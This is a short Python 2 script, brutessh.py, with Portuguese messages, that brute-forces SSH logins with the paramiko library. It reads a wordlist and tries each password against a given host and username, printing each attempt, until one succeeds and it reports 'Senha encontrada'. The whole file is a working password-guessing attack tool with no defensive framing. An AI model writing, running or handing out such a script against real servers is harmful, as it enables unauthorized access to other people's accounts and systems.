#!/usr/bin/python
import paramiko,sys

if len(sys.argv) != 4:
	print "Modo de uso: python brutessh.py host user pass.txt"
	sys.exit()
else:

	ssh = paramiko.SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open(sys.argv[3])
for palavra in f.readlines():
	senha = palavra.strip()

	try:
		ssh.connect(sys.argv[1], username=sys.argv[2], password=senha)

	except paramiko.ssh_exception.AuthenticationException:

		print "Testando com:",senha
	else:
		print "[+] Senha encontrada ===>",senha
		break
ssh.close()
